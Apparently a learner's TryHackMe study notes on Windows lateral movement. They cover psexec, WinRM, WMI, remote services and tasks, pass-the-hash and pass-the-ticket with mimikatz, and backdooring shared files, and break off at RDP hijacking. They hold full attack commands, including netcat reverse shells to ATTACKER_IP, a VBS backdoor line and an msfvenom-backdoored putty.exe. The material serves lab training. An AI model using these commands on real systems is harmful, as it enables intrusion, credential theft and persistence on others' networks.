# Lateral Movement and Pivoting

## Moving Through the Network
### Adminitstrators and UAC
Two types of administrtors:
- Local accounts part of the local Administrators group `{NitBIOS_Name}\administrator ex)example\administrator, {DOMAIN_NAME}\administrator ex)example.com\administrator`
- Domain accounts part of the local Administrators group `.\administrator`  

User Account Control([UAC](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction)) restricts local administrators privirege.  

- By default, local administrators won't be able to remotely connect to a machine and perform administrative tasks unless using an interactive session through RDP.   
- Domain accounts with local administration privileges won't be subject to the same treatment and will be logged in with full administrative privileges.  

## Spawning Processes Remotely

### Psexec
- Ports: 445/TCP (SMB)
- Required Group Memberships: Administrators  

Psexec is one of many Sysinternals Tools and can be downloaded [here](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).  

```
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```

### Remote Process Creation Using WinRM
- Ports: 5985/TCP (WinRM HTTP) or 5986/TCP(WinRM HTTPS)
- Required Group Memberships: Remote Management Users  

Windows Remote Management (WinRM) is a web-based protocol used to send Powershell commands to Windows hosts remotely. Most Windows Server installations will have WinRM enabled by default, making it an attractive attack vector.  
To connect to a remote Powershell session from the command line, we can use the following command:  
`winrs.exe -u:Administrator -p:Mypass123 -r:target cmd`  
We can achieve the same from Powershell, but to pass different credentials, we will need to create a PSCredential object:
```
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```  
Once we have our PSCredential object, we can create an interactive session using the Enter-PSSession cmdlet:  
```
Enter-PSSession -Computername TARGET -Credential $credential
```  
Powershell also includes the Invoke-Command cmdlet, which runs ScriptBlocks remotely via WinRM. Credentials must be passed through a PSCredential object as well:
```
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```

### Remotely Creating Services Using sc
- Ports:
    - 135/TCP, 49152-65535/TCP (DCE/RPC)
    - 445/TCP (RPC over SMB Named Pipes)
    - 139/TCP (RPC over SMB Named Pipes)
- Required Group Memberships: Administrators  
We can create and start a service named "THMservice" using the following commands:  
```
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
```
To stop and delete the service, we can then execute the following commands:
```
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
```

### Creating Scheduled Tasks Remotely
To create a task named THMtask1, we can use the following commands:  
```
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 

schtasks /s TARGET /run /TN "THMtask1" 
```
Since the system will run the scheduled task, the command's output won't be available to us, making this a blind attack.  
Finally, to delete the scheduled task, we can use the following command and clean up after ourselves:
```
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```

## Moving Laterally Using WMI
WMI(Windows Management Instrumentation) is Windows implementation of Web-Based Enterprise Management (WBEM), an enterprise standard for accessing management information across devices.

### Connecting to WMI From Powershell
Before being able to connect to WMI using Powershell commands, we need to create a PSCredential object with our user and password. This object will be stored in the $credential variable and utilised throughout the techniques on this task:
```
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```
- DCOM: RPC over IP will be used for connecting to WMI. This protocol uses port 135/TCP and ports 49152-65535/TCP.
- Wsman: WinRM will be used for connecting to WMI. This protocol uses ports 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS).  

To establish a WMI session from Powershell, we can use the following commands and store the session on the $Session variable.
```
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

### Remote Process Creation Using WMI
- Ports:
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- Required Group Memberships: Administrators  

We can remotely spawn a process from Powershell by leveraging Windows Management Instrumentation (WMI), sending a WMI request to the Win32_Process class to spawn the process under the session we created before:
```
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}
```
On legacy systems, the same can be done using wmic from the command prompt:
```
wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe" 
```

### Creating Services Remotely with WMI
- Ports:
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- Required Group Memberships: Administrators  

We can create services with WMI through Powershell. To create a service called THMService2, we can use the following command:
```
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "THMService2";
DisplayName = "THMService2";
PathName = "net user munra2 Pass123 /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}
```
And then, we can get a handle on the service and start it with the following commands:
```
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"

Invoke-CimMethod -InputObject $Service -MethodName StartService
```
Finally, we can stop and delete the service with the following commands:
```
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

### Creating Scheduled Tasks Remotely with WMI
- Ports:
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- Required Group Memberships: Administrators  

We can create and execute scheduled tasks by using some cmdlets available in Windows default installations:
```
# Payload must be split in Command and Args
$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```
To delete the scheduled task after it has been used, we can use the following command:
```
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

### Installing MSI packages through WMI
- Ports:
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- Required Group Memberships: Administrators
MSI is a file format used for installers. If we can copy an MSI package to the target system, we can then use WMI to attempt to install it for us. The file can be copied in any way available to the attacker. Once the MSI file is in the target system, we can attempt to install it by invoking the Win32_Product class through WMI:
```
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```
We can achieve the same by us using wmic in legacy systems:
```
wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
```

## Use of Alternate Authentication Material

### NTLM Authentication
![ntlm](https://github.com/nkn-ctrl/TryHackMe/assets/73976100/7a3d4ba8-6638-4241-899f-7996289fded1)

#### Pass-the-Hash
If the Windows domain is configured to use NTLM authentication, we can Pass-the-Hash (PtH) and authenticate successfully.  
To extract NTLM hashes, we can either use mimikatz to read the ***local SAM*** or extract hashes directly from ***LSASS memory***.  

- Extracting NTLM hashes from local SAM:  
    This method will only allow you to get hashes from local users on the machine. No domain user's hashes will be available.
```
C:\> C:\tools\mimikatz.exe

mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # lsadump::sam   
RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 145e02c50333951f71d13c245d352b50
```

- Extracting NTLM hashes from LSASS memory:  
    This method will let you extract any NTLM hashes for local users and any domain user that has recently logged onto the machine.
```
mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # sekurlsa::msv 
Authentication Id : 0 ; 308124 (00000000:0004b39c)
Session           : RemoteInteractive from 2 
User Name         : bob.jenkins
Domain            : ZA
Logon Server      : THMDC
Logon Time        : 2022/04/22 09:55:02
SID               : S-1-5-21-3330634377-1326264276-632209373-4605
        msv :
         [00000003] Primary
         * Username : bob.jenkins
         * Domain   : ZA
         * NTLM     : 6b4a57f67805a663c818106dc0648484
```  

We can then use the extracted hashes to perform a PtH attack by using mimikatz to inject an access token for the victim user on a reverse shell (or any other command you like) as follows:  
```
user@AttackBox$ nc -lvp 5555
```
```
mimikatz # token::revert
mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
```
`token::revert`: to reestablish our original token privileges, as trying to pass-the-hash with an elevated token won't work.  

***Passing the Hash Using Linux:***
Connect to RDP using PtH:  
`xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH`  
Connect via psexec using PtH:  
`psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP`  
Note: Only the linux version of psexec support PtH.  
Connect to WinRM using PtH:  
`evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH`

### Kerberos Authentication
<img src="https://github.com/nkn-ctrl/TryHackMe/assets/73976100/646465a0-b5ce-4460-b9b7-6a3ae6a38307" width=600>  

<details>
The user sends his username and a timestamp encrypted using a key derived from his password to the Key Distribution Center (KDC), a service usually installed on the Domain Controller in charge of creating Kerberos tickets on the network.

The KDC will create and send back a Ticket Granting Ticket (TGT), allowing the user to request tickets to access specific services without passing their credentials to the services themselves. Along with the TGT, a Session Key is given to the user, which they will need to generate the requests that follow.

Notice the TGT is encrypted using the krbtgt account's password hash, so the user can't access its contents. It is important to know that the encrypted TGT includes a copy of the Session Key as part of its contents, and the KDC has no need to store the Session Key as it can recover a copy by decrypting the TGT if needed.
</details>  

<img src="https://github.com/nkn-ctrl/TryHackMe/assets/73976100/db298eea-7dc1-4943-971c-567db4c05fcc" width=600>  
<details>
When users want to connect to a service on the network like a share, website or database, they will use their TGT to ask the KDC for a Ticket Granting Service (TGS). TGS are tickets that allow connection only to the specific service for which they were created. To request a TGS, the user will send his username and a timestamp encrypted using the Session Key, along with the TGT and a Service Principal Name (SPN), which indicates the service and server name we intend to access.

As a result, the KDC will send us a TGS and a Service Session Key, which we will need to authenticate to the service we want to access. The TGS is encrypted using the Service Owner Hash. The Service Owner is the user or machine account under which the service runs. The TGS contains a copy of the Service Session Key on its encrypted contents so that the Service Owner can access it by decrypting the TGS.
</details>

<img src="https://github.com/nkn-ctrl/TryHackMe/assets/73976100/15611198-53b3-486f-8634-1dede03accec" width=600>  
<details>
The TGS can then be sent to the desired service to authenticate and establish a connection. The service will use its configured account's password hash to decrypt the TGS and validate the Service Session Key.
</details>

#### Pass-the-Ticket
Sometimes it will be possible to extract Kerberos tickets and session keys from LSASS memory using mimikatz. The process usually requires us to have SYSTEM privileges on the attacked machine and can be done as follows:
```
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```
`/export`: output the file "tickets.kirbi"
Once we have extracted the desired ticket, we can inject the tickets into the current session with the following command:
```
mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
```
Injecting tickets in our own session doesn't require administrator privileges. After this, the tickets will be available for any tools we use for lateral movement. To check if the tickets were correctly injected, you can use the klist command:
```
za\bob.jenkins@THMJMP2 C:\> klist

Current LogonId is 0:0x1e43562

Cached Tickets: (1)

#0>     Client: Administrator @ ZA.TRYHACKME.COM
        Server: krbtgt/ZA.TRYHACKME.COM @ ZA.TRYHACKME.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 4/12/2022 0:28:35 (local)
        End Time:   4/12/2022 10:28:35 (local)
        Renew Time: 4/23/2022 0:28:35 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: THMDC.za.tryhackme.com
```

### Overpass-the-hash / Pass-the-Key
We can obtain the Kerberos encryption keys from memory by using mimikatz with the following commands:
```
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```
If we have the RC4 hash:
```
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```
If we have the AES128 hash:
```
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```
If we have the AES256 hash:
```
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```
Notice that when using RC4, the key will be equal to the NTLM hash of a user. This means that if we could extract the NTLM hash, we can use it to request a TGT as long as RC4 is one of the enabled protocols. This particular variant is usually known as Overpass-the-Hash (OPtH).  

## Abusing User Behavior
### Abusing Writable Shares
One common scenario consists of finding a shortcut to a script or executable file hosted on a network share.  
Although the script or executable is hosted on a server, when a user opens the shortcut on his workstation, the executable will be copied from the server to its `%temp%` folder and executed on the workstation. Therefore any payload will run in the context of the final user's workstation (and logged-in user account).  

#### Backdooring .vbs Scripts
As an example, if the shared resource is a VBS script, we can put a copy of nc64.exe on the same share and inject the following code in the shared script:
```
CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True
```
This will copy nc64.exe from the share to the user's workstation `%tmp%` directory and send a reverse shell back to the attacker whenever a user opens the shared VBS script.  

#### Backdooring .exe Files
If the shared file is a Windows binary, say `putty.exe`, you can download it from the share and use msfvenom to inject a backdoor into it. The binary will still work as usual but execute an additional payload silently. To create a backdoored putty.exe, we can use the following command:  
```
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe
```  
The resulting `puttyX.exe` will execute a reverse_tcp meterpreter payload without the user noticing it. Once the file has been generated, we can replace the executable on the windows share and wait for any connections using the `exploit/multi/handler` module from Metasploit.  

### RDP hijacking
When an administrator uses Remote Desktop to connect to a machine and closes the RDP client instead of logging off, his session will remain open on the server indefinitely. If you have SYSTEM privileges on Windows Server 2016 and earlier, you can take over any existing RDP session without requiring a password.  
If we have administrator-level access, we can get SYSTEM by any method of our preference. For now, we will be using psexec to do so. First, let's run a cmd.exe as administrator:
